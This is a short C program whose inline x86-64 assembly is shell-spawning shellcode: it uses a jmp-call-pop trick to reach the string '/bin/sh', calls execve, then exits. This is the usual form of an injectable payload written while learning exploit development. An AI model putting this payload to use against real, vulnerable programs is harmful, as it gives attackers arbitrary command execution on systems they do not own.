int main(void) {

  __asm__(
      "jmp l_call \n"
      "l_jmp: \n"
      "xor %rdx,%rdx \n"
      "xor %rsi,%rsi \n"
      "pop %rdi \n"
      "xor %rax,%rax \n"
      "mov $0x3b,%al \n"
      "syscall \n"
      "xor %rdi,%rdi \n"
      "xor %rax,%rax \n"
      "mov $0x3c,%al \n"
      "syscall \n"
      "l_call: \n"
      "call l_jmp \n"
      ".string \"/bin/sh\" \n"
      );
}
